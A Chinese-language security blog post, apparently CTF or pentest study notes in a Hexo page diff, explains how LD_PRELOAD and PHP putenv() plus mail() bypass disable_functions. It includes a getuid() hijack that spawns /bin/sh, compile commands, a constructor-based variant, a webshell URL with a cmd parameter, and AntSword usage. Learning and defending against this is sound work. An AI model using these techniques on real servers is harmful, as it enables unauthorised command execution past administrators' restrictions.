@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>LD_PRELOAD - 天下同春</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="LD_PRELOAD - 天下同春" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://example.com/2024/02/26/LD_PRELOAD/index.html" />
+  
+  <meta property="og:image" content="/img/P.jpg" />
+  
+  <meta property="og:article:published_time" content="2024-02-26T11:00:08.000Z" />
+  
+  <meta property="og:article:author" content="void2eye" />
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+
+  
+    <script src='https://unpkg.com/@waline/client@v2/dist/waline.js'></script>
+    <link
+      rel="stylesheet"
+      href="https://unpkg.com/@waline/client@v2/dist/waline.css"
+    />
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+    <body
+        data-color-scheme="auto"
+        data-uppercase-categories="true"
+        
+        data-rainbow-banner="true"
+        data-rainbow-banner-shown="auto"
+        data-rainbow-banner-month="6"
+        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+        
+        data-config-root="/"
+        
+        data-toc="true"
+        data-toc-max-depth="2"
+        
+        
+    >
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">天下同春</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/">Home</a>
+            
+            
+            
+            <a class="nav-item" href="/archives">Archives</a>
+            
+            
+            
+            <a class="nav-item" href="/friends">Friends</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/void2eye" target="_blank" aria-label="GitHub">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        
+<article class="post">
+    <div class="meta">
+        
+        <div class="categories text-uppercase">
+        
+            <a href="/categories/Web/">Web</a>
+        
+            <a href="/categories/Web/PHP/">PHP</a>
+        
+        </div>
+        
+
+        
+        <div class="date" id="date">
+            <span>February</span>
+            <span>26,</span>
+            <span>2024</span>
+        </div>
+        
+
+        <h1 class="title">LD_PRELOAD</h1>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p><code>LD_PRELOAD</code> 是一个在 Linux 系统中非常强大的环境变量</p>
+<p><code>LD_PRELOAD</code> 是 Linux 动态链接器 <code>ld.so</code> 提供的一项功能。其工作原理是：当程序运行时，操作系统会加载它所需的共享库（.so 文件），而 <code>LD_PRELOAD</code> 可以在加载这些库之前指定先加载哪些库。这就意味着：</p>
+<ul>
+<li>如果在 <code>LD_PRELOAD</code> 中列出的库与程序原本需要的库存在相同的函数定义，那么 <code>LD_PRELOAD</code> 中的函数会<strong>覆盖</strong>原本库中的相应函数实现。</li>
+<li>如果 <code>LD_PRELOAD</code> 中的库没有覆盖原本的函数，那么程序会正常地继续加载它需要的库。</li>
+</ul>
+<p>我们通过环境变量 LD_PRELOAD 劫持系统函数，可以达到不调用 PHP 的各种命令执行函数（system()、exec() 等等）仍可执行系统命令的目的。</p>
+<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>能够上传自己的<code>.so</code>文件</p>
+<p>能够控制LD_PRELOAD环境变量的值，比如<code>putenv()</code>函数</p>
+<p>因为新进程启动将加载LD_PRELOAD中的.so文件，所以要存在可以<code>控制PHP启动外部程序</code>的函数并能执行，比如<code>mail()</code>、<code>imap_mail()</code>、<code>mb_send_mail()</code>和<code>error_log()</code>函数等</p>
+<h3 id="动态链接机制的工作原理"><a href="#动态链接机制的工作原理" class="headerlink" title="动态链接机制的工作原理"></a>动态链接机制的工作原理</h3><p>当你在 Linux 系统中运行一个程序时，程序通常会依赖多个共享库（共享对象 <code>.so</code> 文件）。动态链接器（<code>ld.so</code>）的任务就是在程序启动时找到并加载这些共享库，同时解析程序中需要的函数符号（函数的地址和实现）。这个过程大致包括以下几个步骤：</p>
+<ol>
+<li><strong>程序启动时的符号解析</strong>：程序代码中如果需要调用某个函数（例如 <code>b()</code>），链接器会根据程序运行时的动态库依赖，去找到包含这个函数的共享对象（如 <code>c.so</code>）。</li>
+<li><strong>符号查找顺序</strong>：当动态链接器解析符号（例如函数 <code>b()</code>）时，它遵循一定的顺序。这就决定了程序会首先找到哪个库中的 <code>b()</code> 实现。</li>
+</ol>
+<h3 id="LD-PRELOAD-如何改变符号查找顺序"><a href="#LD-PRELOAD-如何改变符号查找顺序" class="headerlink" title="LD_PRELOAD 如何改变符号查找顺序"></a><code>LD_PRELOAD</code> 如何改变符号查找顺序</h3><p>通常情况下，动态链接器按照以下步骤查找符号：</p>
+<ol>
+<li><strong>程序内部定义的符号</strong>：首先，动态链接器会在程序内部查找符号（函数、变量等）。</li>
+<li><strong>依赖的共享库</strong>：如果程序没有定义这个符号，链接器就会去查找程序依赖的共享库。例如，如果程序依赖 <code>c.so</code>，就会在 <code>c.so</code> 中寻找 <code>b()</code> 的实现。</li>
+<li><strong>标准系统库</strong>：如果依赖库中也没有找到，动态链接器会继续在标准系统库（如 libc.so 等）中查找。</li>
+</ol>
+<p>然而，当设置了 <code>LD_PRELOAD</code> 环境变量时，动态链接器的查找顺序发生了改变：</p>
+<ul>
+<li><strong><code>LD_PRELOAD</code> 指定的库优先级最高</strong>：如果 <code>LD_PRELOAD</code> 设置了一个或多个共享库（如 <code>c_evil.so</code>），那么在符号解析时，动态链接器会首先在这些预加载的库中寻找符号。</li>
+<li>如果在 <code>LD_PRELOAD</code> 指定的库中找到了目标符号（如 <code>b()</code>），那么这个符号会覆盖原本系统中默认共享库中的符号。</li>
+</ul>
+<blockquote>
+<p>这意味着，<strong>在 <code>LD_PRELOAD</code> 设置了 <code>c_evil.so</code> 的情况下，动态链接器会优先在 <code>c_evil.so</code> 中查找函数 <code>b()</code> 的定义</strong>，而不会去查找系统的 <code>c.so</code> 中的 <code>b()</code> 函数。</p>
+</blockquote>
+<p>编写一个原型为 uid_t getuid(void); 的 C 函数，内部执行攻击者指定的代码，并编译成共享对象 getuid_shadow.so；</p>
+<h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><h3 id="攻击流程-1"><a href="#攻击流程-1" class="headerlink" title="攻击流程"></a>攻击流程</h3><h4 id="1-编写-getuid-函数并编译为共享对象"><a href="#1-编写-getuid-函数并编译为共享对象" class="headerlink" title="1. 编写 getuid() 函数并编译为共享对象"></a>1. 编写 <code>getuid()</code> 函数并编译为共享对象</h4><p>攻击者编写一个和标准库中 <code>getuid()</code> 函数具有相同签名的函数。<code>getuid()</code> 是一个标准的 POSIX 系统调用，它返回调用进程的用户 ID。因为许多程序（如 <code>sendmail</code>）在运行过程中会调用这个函数，所以攻击者可以利用它作为一个劫持的目标。</p>
+<p>攻击者编写的 <code>getuid()</code> 函数不仅返回用户 ID，还可以包含恶意代码，如执行系统命令：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 自定义的 getuid() 函数，模拟标准的系统调用</span></span><br><span class="line"><span class="type">uid_t</span> <span class="title function_">getuid</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="comment">// 这里执行恶意操作，比如启动一个 shell</span></span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);  <span class="comment">// 启动 shell</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回一个假的 UID 或者真实的 UID，保证正常流程不受影响</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1000</span>;  <span class="comment">// 返回一个伪造的 UID，程序继续正常运行</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>编译</strong>成共享对象（动态链接库），以便之后通过 <code>LD_PRELOAD</code> 进行加载：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -o getuid_shadow.so getuid_shadow.c</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>**<code>-fPIC</code>**：表示生成位置无关代码（Position Independent Code），这是创建共享库时所需的。</li>
+<li>**<code>-shared</code>**：表示编译成一个共享对象 <code>.so</code> 文件。</li>
+</ul>
+<p>生成的 <code>getuid_shadow.so</code> 是一个包含攻击者自定义 <code>getuid()</code> 实现的共享对象。</p>
+<h4 id="2-使用-putenv-设置-LD-PRELOAD-环境变量"><a href="#2-使用-putenv-设置-LD-PRELOAD-环境变量" class="headerlink" title="2. 使用 putenv() 设置 LD_PRELOAD 环境变量"></a>2. 使用 <code>putenv()</code> 设置 <code>LD_PRELOAD</code> 环境变量</h4><p>接下来，攻击者利用 PHP 的 <code>putenv()</code> 函数来设置环境变量 <code>LD_PRELOAD</code>，从而劫持程序对 <code>getuid()</code> 函数的调用。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=/path/to/getuid_shadow.so&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong><code>LD_PRELOAD</code></strong> 是一个环境变量，它告诉 Linux 动态链接器在加载任何共享库之前，首先加载 <code>LD_PRELOAD</code> 指定的共享对象。这样，当任何新进程启动时，系统首先会加载攻击者指定的共享对象 <code>getuid_shadow.so</code>，然后使用这个共享对象中实现的 <code>getuid()</code> 函数，而不是系统库中的 <code>getuid()</code>。</li>
+<li>使用 PHP 的 <code>putenv()</code> 函数可以在 PHP 进程的环境中设置这个变量，影响后续的进程（如 <code>sendmail</code>）加载的共享库顺序。</li>
+</ul>
+<h4 id="3-利用-mail-函数触发新进程的创建"><a href="#3-利用-mail-函数触发新进程的创建" class="headerlink" title="3. 利用 mail() 函数触发新进程的创建"></a>3. 利用 <code>mail()</code> 函数触发新进程的创建</h4><p>接下来，攻击者调用 PHP 的 <code>mail()</code> 函数。虽然 PHP 的常规命令执行函数（如 <code>system()</code>、<code>exec()</code>）可能已被禁用，但 <code>mail()</code> 函数通常仍然可以使用，并且 <code>mail()</code> 函数内部会启动 <code>sendmail</code> 进程来发送邮件。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mail</span>(<span class="string">&quot;example@example.com&quot;</span>, <span class="string">&quot;Test Subject&quot;</span>, <span class="string">&quot;Test Message&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong><code>mail()</code> 函数</strong>是 PHP 内置的一个函数，用于发送电子邮件。在内部，<code>mail()</code> 函数会调用系统的邮件传送代理（如 <code>sendmail</code>），这会启动一个新的进程 <code>/usr/sbin/sendmail</code>。</li>
+<li><code>sendmail</code> 在其执行过程中，通常会调用系统函数 <code>getuid()</code> 来获取当前用户的 UID。</li>
+</ul>
+<h4 id="4-LD-PRELOAD-的作用：劫持-getuid-函数"><a href="#4-LD-PRELOAD-的作用：劫持-getuid-函数" class="headerlink" title="4. LD_PRELOAD 的作用：劫持 getuid() 函数"></a>4. <code>LD_PRELOAD</code> 的作用：劫持 <code>getuid()</code> 函数</h4><p>由于 <code>putenv()</code> 已经将 <code>LD_PRELOAD</code> 设置为攻击者的共享对象 <code>getuid_shadow.so</code>，所以当 <code>sendmail</code> 进程启动并调用 <code>getuid()</code> 函数时，系统会首先加载并使用 <code>getuid_shadow.so</code> 中的 <code>getuid()</code> 函数，而不是标准库中的 <code>getuid()</code>。</p>
+<p>因此，<code>sendmail</code> 进程在执行 <code>getuid()</code> 时，实际上调用的是攻击者的恶意版本：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);  <span class="comment">// 启动一个 shell</span></span><br></pre></td></tr></table></figure>
+
+<p>这会执行攻击者指定的恶意操作（如启动 shell，执行其他系统命令等）。通过这种方式，攻击者绕过了 PHP 中对系统命令执行函数的限制，而成功执行了操作系统级别的命令。</p>
+<h2 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h2><p>一是，某些环境中，web 禁止启用 sendmail、甚至系统上根本未安装 sendmail，也就谈不上劫持 getuid()，通常的 www-data 权限又不可能去更改 php.ini 配置、去安装 sendmail 软件；</p>
+<p>二是，即便目标可以启用 sendmail，由于未将主机名（hostname 输出）添加进 hosts 中，导致每次运行 sendmail 都要耗时半分钟等待域名解析超时返回，www-data 也无法将主机名加入 hosts（如，127.0.0.1 lamp、lamp.、lamp.com）。</p>
+<h2 id="大佬yangyangwithgnu的破局"><a href="#大佬yangyangwithgnu的破局" class="headerlink" title="大佬yangyangwithgnu的破局"></a>大佬yangyangwithgnu的破局</h2><p>在加载时就执行代码（拦劫启动进程），而不用考虑劫持某一系统函数</p>
+<blockquote>
+<p>回到 LD_PRELOAD 本身，系统通过它预先加载共享对象，如果能找到一个方式，在加载时就执行代码，而不用考虑劫持某一系统函数，那我就完全可以不依赖 sendmail 了。这种场景与 C++ 的构造函数简直神似！</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p>
+<p>GCC 有个 C 语言扩展修饰符 <code>__attribute__((constructor))</code>，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 <code>__attribute__((constructor))</code> 修饰的函数。</p>
+<p>例子：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 在共享对象加载时执行的函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_library</span><span class="params">(<span class="type">void</span>)</span> __<span class="title function_">attribute__</span><span class="params">((constructor))</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_library</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Library loaded! Executing constructor function.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 一个普通的函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">my_function</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This is a function in the shared object.\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -o libexample.so -fPIC libexample.c</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">void</span> *handle;</span><br><span class="line">    <span class="type">void</span> (*func)();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 动态加载共享对象</span></span><br><span class="line">    handle = dlopen(<span class="string">&quot;./libexample.so&quot;</span>, RTLD_LAZY);</span><br><span class="line">    <span class="keyword">if</span> (!handle) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s\n&quot;</span>, dlerror());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查找函数地址</span></span><br><span class="line">    func = dlsym(handle, <span class="string">&quot;my_function&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!func) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s\n&quot;</span>, dlerror());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用共享对象中的函数</span></span><br><span class="line">    func();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭共享对象</span></span><br><span class="line">    dlclose(handle);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>**<code>RTLD_LAZY</code>**：表示惰性解析符号。也就是说，只有在符号（函数或变量）真正被使用时，才会解析该符号。这种方式提高了性能，特别是在库中有很多函数时，程序只会解析实际需要调用的函数。</p>
+<p>另一个常见的标志是 **<code>RTLD_NOW</code>**，它会立即解析库中的所有符号。如果符号解析失败，<code>dlopen()</code> 将立即返回错误。</p>
+<p><strong><code>dlsym()</code></strong> 用于获取共享库中指定函数的地址。它的第一个参数是 <code>dlopen()</code> 返回的句柄，第二个参数是要查找的函数名称（以字符串形式给出）。在这里，查找的是 <code>libexample.so</code> 中的 <code>my_function</code> 函数。</p>
+<p>如果找到了指定的函数，<code>dlsym()</code> 返回该函数的地址，程序可以通过函数指针 <code>func</code> 调用它。如果没有找到指定的符号，<code>dlsym()</code> 返回 <code>NULL</code>，并通过 <code>dlerror()</code> 获取错误信息。</p>
+<p><strong><code>dlclose()</code></strong> 用于关闭通过 <code>dlopen()</code> 打开的共享库，并释放其相关资源。关闭后，句柄 <code>handle</code> 将不再有效，程序不能再通过它访问共享库中的符号。</p>
+<p>如果不调用 <code>dlclose()</code>，共享库会一直保持在内存中，直到程序退出。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -o main main.c -ldl</span><br><span class="line">./main</span><br></pre></td></tr></table></figure>
+
+<p>通过 LD_PRELOAD 劫持了启动进程的行为，劫持后又启动了另外的新进程，若不在新进程启动前取消 LD_PRELOAD，则将陷入无限循环，所以必须得删除环境变量 LD_PRELOAD。最直观的做法是调用 <code>unsetenv(&quot;LD_PRELOAD&quot;)</code>，这在大部份 linux 发行套件上的确可行，但在 centos 上却无效，究其原因，centos 自己也 hook 了 unsetenv()，在其内部启动了其他进程，根本来不及删除 LD_PRELOAD 就又被劫持，导致无限循环。所以，我得找一种比 unsetenv() 更直接的删除环境变量的方式。是它，全局变量 <code>extern char** environ</code>！实际上，unsetenv() 就是对 environ 的简单封装实现的环境变量删除功能。</p>
+<p>项目中有三个关键文件，bypass_disablefunc.php、bypass_disablefunc_x64.so、bypass_disablefunc_x86.so。</p>
+<p>bypass_disablefunc.php 为命令执行 webshell，提供三个 GET 参数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure>
+
+
+
+<p>一是 cmd 参数，待执行的系统命令（如 pwd）；二是 outpath 参数，保存命令执行输出结果的文件路径（如 &#x2F;tmp&#x2F;xx），便于在页面上显示，另外该参数，你应注意 web 是否有读写权限、web 是否可跨目录访问、文件将被覆盖和删除等几点；三是 sopath 参数，指定劫持系统函数的共享对象的绝对路径（如 &#x2F;var&#x2F;www&#x2F;bypass_disablefunc_x64.so），另外关于该参数，你应注意 web 是否可跨目录访问到它。此外，bypass_disablefunc.php 拼接命令和输出路径成为完整的命令行，所以你不用在 cmd 参数中重定向。</p>
+<p>bypass_disablefunc_x64.so 为执行命令的共享对象，用命令 <code>gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc_x64.so</code> 将 bypass_disablefunc.c 编译而来。 若目标为 x86 架构，需要加上 -m32 选项重新编译，bypass_disablefunc_x86.so。</p>
+<p>想办法将 bypass_disablefunc.php 和 bypass_disablefunc_x64.so 传到目标，指定好三个 GET 参数后，bypass_disablefunc.php 即可突破 disable_functions。执行 <code>cat /proc/meminfo</code>：</p>
+<h2 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h2><p>对于bypass_disablefunc.php，权限上传到web目录的直接访问，无权限的话可以传到tmp目录后用include等函数来包含，并且需要用 GET 方法提供三个参数：</p>
+<p>Antsword有插件。</p>
+<p>我们选择<code>LD_PRELOAD</code>模式并点击开始按钮，成功后蚁剑会在<code>/var/www/html</code>目录里上传一个<code>.antproxy.php</code>文件。我们创建副本, 并将连接的 URL shell 脚本名字改为<code>.antproxy.php</code>获得一个新的shell，在这个新shell里面就可以成功执行命令了。</p>
+
+    </div>
+
+    
+    <div class="about">
+        <h1>About this Post</h1>
+        <div class="details">
+            <p>This post is written by void2eye, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+        </div>
+        
+        <p class="tags">
+            
+            <i class="icon"></i>
+            <a href="/tags/Web/" class="tag">#Web</a>
+        </p>
+        
+    </div>
+    
+
+    <div class="container post-prev-next">
+        
+        <a href="/2024/02/26/FFI/" class="next">
+            <div>
+                <div class="text">
+                    <p class="label">Next</p>
+                    <h3 class="title">FFI真解</h3>
+                </div>
+            </div>
+        </a>
+        
+        
+        <a href="/2024/02/26/RCE/" class="prev">
+            <div>
+                <div class="text">
+                    <p class="label">Previous</p>
+                    <h3 class="title">RCE函数和命令</>
+                </div>
+            </div>
+        </a>
+        
+    </div>
+
+    
+        
+        <div class="container">
+            <div id="waline"></div>
+            <script>
+                new Waline({
+                    el: "#waline",
+                    
+                    path: location.pathname,
+                    
+                    serverURL: https://blogcomment-blond.vercel.app/,
+                    
+                    requiredMeta: ['nick'],
+                    
+                });
+            </script>
+        </div>
+        
+        
+    
+</article>
+
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h2 class="title">Blog</h2>
+                
+                <a href="/" class="item">Blog</a>
+                
+                <a href="/archives" class="item">Archives</a>
+                
+                <a href="/search" class="item">Search</a>
+                
+                <a href="/friends" class="item">Friends</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Projects</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/void2eye/Registration-tool-automatic-submission-script" class="item">RE_tools</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Me</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+                
+                <a href="mailto:2110027730@qq.com" class="item">Email</a>
+                
+            </div>
+            
+        </div>
+        <span>&copy; 2024 void2eye<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
+        
+        <br>
+        <span class="footer-extra-description"><a href="https://beian.miit.gov.cn/" target="_blank">浙ICP备2024135394号</a></span>
+        
+        
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+    </div>
+</footer>
+
+
+        
+<script src="/js/main.js"></script>
+
+        
+        
+        
+
+        
+        <script src="https://unpkg.com/scrollreveal"></script>
+        <script>
+            window.addEventListener('load', () => {
+                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
+                ScrollReveal().reveal('.post-list-item .cover-img img')
+                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
+            })
+        </script>
+        
+    </body>
+</html>
